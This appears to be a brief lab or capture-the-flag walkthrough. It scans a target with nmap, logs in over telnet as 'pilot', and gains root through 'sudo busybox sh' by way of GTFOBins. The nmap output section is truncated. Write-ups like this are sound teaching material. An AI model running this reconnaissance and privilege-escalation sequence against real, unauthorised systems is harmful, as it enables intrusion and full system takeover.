## Nmap Scan ##

We start by running our usual nmap scan
```sudo nmap -sSCV -T5 10.10.112.36 -p- -oN=nmapScan -vv```

Then we get the output:
```
Nmap scan report for 10.10.112.36

## Setting Foothold ###

We can see that there is port 23 open for telnet, which is well known to be an insecure protocol. We will login as ```pilot``` using telnet.

``` telnet 10.10.112.36```

Here we are located in the pilot's use home directory where the user flag is also located so we can just:
``` cat user.txt```

## Privilege Escalation ##

First let's check if we can run any binary as ```root```:
```sudo -l```

We will see that we are allowed to run the binary ```busybox``` as root. Looking it up on ```GTFObins``` we are met with an execution method that would allow us to run a shell with root privileges.

```sudo busybox sh```
```
# whoami
root
# cat /root/root.txt
```
